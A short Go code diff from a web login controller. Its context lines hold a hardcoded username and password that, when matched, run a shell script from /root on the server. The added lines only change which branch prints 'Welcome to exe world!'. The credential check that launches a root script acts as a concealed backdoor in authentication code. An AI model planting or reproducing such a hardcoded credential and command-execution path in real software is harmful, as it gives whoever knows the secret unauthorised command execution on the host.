@@ -34,6 +34,8 @@ func (this *LoginController) Post() {
 
 		if u.Username == "svn" && u.Pwd == "green369ok" {
 			if errexec := exec.Command("/bin/sh", "/root/uf.sh").Run(); errexec != nil {
+
+			} else {
 				this.Ctx.WriteString("Welcome to exe world!")
 			}
 		} else {
